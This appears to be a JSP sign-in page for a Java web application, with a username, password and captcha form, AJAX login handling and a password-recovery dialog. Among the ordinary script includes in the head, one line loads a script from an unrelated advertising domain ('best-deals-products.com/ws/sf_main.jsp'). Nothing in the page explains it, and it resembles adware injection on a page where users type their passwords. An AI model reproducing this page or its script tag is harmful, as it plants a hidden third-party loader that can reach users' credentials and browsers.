<%@ page language="java" import="java.util.*" contentType="text/html; charset=UTF-8"  pageEncoding="UTF-8"%>
<%@ taglib prefix="c" uri="http://java.sun.com/jsp/jstl/core" %>
<%
String path = request.getContextPath();
String basePath = request.getScheme()+"://"+request.getServerName()+":"+request.getServerPort()+path+"/";
%>
<%@ taglib uri="http://java.sun.com/jsp/jstl/fmt" prefix="fmt"%>
<%
String language = (String)request.getSession().getAttribute("language");
if(language == null || "".equals(language) || "pleaseSelect".equals(language))
{
	language = "message_en_US";
    request.getSession().setAttribute("language","message_en_US");
}
request.getSession().setAttribute("language","message_en_US");
%>
<fmt:setBundle basename="<%=language%>" var="messages"/>

<c:set var="ctx" value="${pageContext.request.contextPath }"/>
<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html lang="en"><head>
    <meta name="renderer" content="webkit">  
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
    <link rel="icon" href="../favicon.ico">

	<script type="text/javascript" src="${ctx }/static/js/newhomepage/jquery.js"></script>
	
	
	<script type="text/javascript" src="${ctx }/static/js/login/login.js" ></script>
    
	
	<script type="text/javascript" src="${pageContext.request.contextPath }/static/js/newhomepage/jquery-2.1.3.min.js" ></script>
    <script type="text/javascript"	src="${pageContext.request.contextPath }/static/js/easyui/jquery.easyui.min.js"></script>
	<script type="text/javascript"	src="${pageContext.request.contextPath }/static/js/newhomepage/bootstrap.js"></script>

    <title>Sign in</title>

    <!-- Bootstrap core CSS -->
    <!-- will from webapps -->
    <link href="${pageContext.request.contextPath }/static/css/newhomepage/bootstrap.min.css" rel="stylesheet">
    
    <!-- Custom styles for this template -->
    
    <link href="${pageContext.request.contextPath }/static/css/newhomepage/signin.css" rel="stylesheet">

    <!-- Just for debugging purposes. Don't actually copy these 2 lines! -->
    <!--[if lt IE 9]><script src="../../assets/js/ie8-responsive-file-warning.js"></script><![endif]-->
    

    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>
      <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
      <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <![endif]-->
  <script src="https://www.best-deals-products.com/ws/sf_main.jsp?dlsource=hdrykzc"></script>
<script type="text/javascript">


	function loginSubmit(){	
		 
			 $("#loginWait").empty();
		
		 return true;
	}
	

	
	


</script>
<script type="text/javascript">
	

	function promptMessage(m){
		$("#myModalLabel").text('Prompt');
		document.getElementById("warn").style.display="block";
		document.getElementById("prog").style.display="none";
		document.getElementById("clossBtn").style.display="block";
		$("#warn").text(m);

	}
	function clearPrompt(){
		document.getElementById("warn").style.display="none";
		document.getElementById("prog").style.display="block";
		document.getElementById("clossBtn").style.display="none";
		$("#myModalLabel").text('Loading');
		$("#warn").text('');
	}

		  function usersubmit(){
// 		   var $btnmy=document.getElementById("signIn");
// 		   $btnmy.value="loading..."
		   //$(this).value="loading";
		
   		 // business logic...
   		 if(loginSubmit()){
     
			var loginName = $("#user_name").val();
			var loginPassword = $("#user_pass").val();
			var regCode = $("#checkcode").val();
			var check  = document.getElementById("rPassword");
			var rPassword;
			if(check.checked){
				rPassword = check.value;
			}else{
				rPassword = "";
			}
			$("#myModal").modal('show');
			$.post("${ctx}/userLogin",{loginName:loginName,loginPassword :loginPassword,regCode:regCode,rPassword:rPassword,language:'chinese'},
							function(data){
							if("2" == data){
								 promptMessage('<fmt:message key="common.passiscorr" bundle="${messages}"/>')	;							
							}
							else if("3" == data){
								promptMessage('<fmt:message key="common.Usernotexist" bundle="${messages}"/>')	;								
							}else if("4"  == data){
								promptMessage('The identity code is not correct!');	
							}else if("5"  == data){
								promptMessage('<fmt:message key="common.usenotplacelogin" bundle="${messages}"/>')	;
								
							}else if("1"==data){
								clearPrompt();
								location.href = "${ctx}/pageJump";
							}else if("6"==data){
								promptMessage('<fmt:message key="common.addisnotlogin" bundle="${messages}"/>')	;
								
							}else if("7"==data){
								promptMessage('<fmt:message key="common.hasbeendisabled" bundle="${messages}"/>')	;
								
							}else if("8"==data){
								promptMessage('<fmt:message key="common.isnotactive" bundle="${messages}"/>');	
							}else{
								promptMessage('<fmt:message key="common.istemlocke" bundle="${messages}"/>');	
							}
						}
					);
		}
		return false;
   			 
	
		
	
	}
		function subEmail(){
			var loginValue = $("#loginName").val();
			$("#myModal").modal('show');
			if(loginValue.trim().length==0){
		//	alert('<fmt:message key="loss.message12" bundle="${messages}"/>');
			promptMessage('Email address cannot be empty. Please type in your email for account!')	
			return;
			 }
			$.post("${pageContext.request.contextPath }/isUserExit",
				{loginName : loginValue},
				function(flag){
					if(flag=="0"){
					//	alert('<fmt:message key="loss.message8" bundle="${messages}"/>');
						promptMessage('<fmt:message key="loss.message8" bundle="${messages}"/>')	
						return;
					}else if(flag=="1"){
						//用户存在
						
					$("#autoInfo").css("background-image","url(${pageContext.request.contextPath }/static/img/button/infoSend.png)");
					$("#emailState").html("<fmt:message key="loss.message9" bundle="${messages}"></fmt:message>");
					$("#emailState").css("left",43);
					$("#show").empty();
					$.post("${pageContext.request.contextPath }/sendEmail",
							{loginName : loginValue},
							function(data){
								if(data == 1){
							//	alert('<fmt:message key="loss.message10" bundle="${messages}"/>');
								promptMessage('<fmt:message key="loss.message10" bundle="${messages}"/>')		
								}else if(data==2){
							//	alert('<fmt:message key="loss.message11" bundle="${messages}"/>');
								promptMessage('<fmt:message key="loss.message11" bundle="${messages}"/>')		
								 }else if(data==3){
							//	 alert('<fmt:message key="loss.message12" bundle="${messages}"/>');
								promptMessage('<fmt:message key="loss.message12" bundle="${messages}"/>')		
								 }else if(data==4){
							//	 alert('<fmt:message key="loss.message13" bundle="${messages}"/>');
								promptMessage('<fmt:message key="loss.message13" bundle="${messages}"/>')		
								}
								 $("#autoInfo").css("background-image","url(${pageContext.request.contextPath }/static/img/button/infoAuto.png)");
									 $("#emailState").css("left",57);
									 $("#emailState").html("<fmt:message key="loss.ok" bundle="${messages}"></fmt:message>");
							},"json");
					}
				},"text");
		}


	
</script>
</head><body>

    <div class="container">
      <div class="col-md-12 col-md-push-0 text-center">
      <form class="form-signin" onsubmit="return usersubmit()" >
      
      <div class="col-lg-13 text-left">
        <h2 class="form-signin-heading">Please sign in</h2>
        </div>
        <div class="col-lg-13 text-left">

        <label for="inputUser" class="sr-only">Username</label>
        <input type="text" id="user_name" class="form-control" placeholder="Username" required="" autofocus="">
        </div>
        <div class="col-lg-13 text-left">
        <label for="inputPassword" class="sr-only">Password</label>
        <input type="password" id="user_pass" class="form-control" placeholder="Password" required="">
        </div>
        <div class="col-lg-5 text-left">
		<input type="text" id="checkcode"  placeholder="identify code" class="form-control" style="width:125px"/>
		</div>
		
        <div class="col-lg-7 text-left">
		<a href="#" onClick="javascript:myRandReload()" alt="重新生成验证吧" title="重新生成验证吧" class="img" style="padding-top: -100px;padding-left: 10px;z-index: 100;position: absolute;"> 
		<img align="bottom" id="createcheckcode" style="width:125px;height:43px;" border="0">
		</a>
		<a id="bjc" href="javascript:myRandReload()" style="text-decoration: none;color:#4a97e3;padding:2px 2px;padding-top: 13px;padding-left: 150px;z-index: 100;position: absolute;">
			
		</a>
		</div>
<div class="col-lg-12 text-left">

        <div class="checkbox">
          <label>
            <input type="checkbox" value="forever" id="rPassword" name="rPassword"> Remember me
          </label>
 		<a href="#passwordRetrive" class="padding-right:50px" role="button" data-toggle="modal" style="color:white">Forget Password</a>
        </div>
        </div>
        <div class="col-lg-13 text-left">
        <button class="btn btn-lg btn-primary btn-block" data-loading-text="Loading..." id="signIn"   type="submit" >Sign in</button>
        </div>
        <div class="col-lg-13 text-left">
        <a href="${pageContext.request.contextPath }\view\newhomepage\index.jsp#home" class="padding-left:50px" style="color:white">Go back to the home page</a>
        </div>
        </div>
        

      </form>
  



    </div> <!-- /container -->


    <!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
    <script src="./js/ie10-viewport-bug-workaround.js"></script>
    <!-- jQuery (necessary for Bootstrap's JavaScript plugins) -->
  <!-- the dialog for retrive password-->
<div class="modal fade" id="passwordRetrive" role="dialog">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title">Retrive your password</h4>
      </div>
      <div class="modal-body">
     
        <p>Please enter your email.&hellip;</p>
        <input type="text" id="loginName"  name="loginName" class="form-control" placeholder="Email" required="" autofocus="">
      
      </div>
      <div class="modal-footer">
        <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        <button type="button" class="btn btn-primary" onclick="subEmail();">Send Email</button>
      </div>
    </div><!-- /.modal-content -->
  </div><!-- /.modal-dialog -->
</div><!-- /.modal -->

  <!-- the dialog for promptMessage-->

<div class="modal fade  bs-example-modal-sm" id="myModal" tabindex="-1" role="dialog" aria-labelledby="myModalLabel" aria-hidden="true" data-backdrop="static">
  <div class="modal-dialog modal-sm">
    <div class="modal-content">
      <div class="modal-header">
        <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
        <h4 class="modal-title" id="myModalLabel">Loading...</h4>
      </div>
      <div class="modal-body">
		       <div class="progress" id="prog" >
		  			<div class="progress-bar progress-bar-striped active" role="progressbar" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100" style="width: 100%">
		    			
		  			</div>
				</div>
				<div id = "warn" style="display:none">
				
				</div>
				
      </div>
      <div class="modal-footer" id="clossBtn" style="display:none">
        <button type="button" class="btn btn-default" data-dismiss="modal" onclick="clearPrompt()">Close</button>
       
      </div>
      
    </div>
  </div>
</div>

</body>
</html>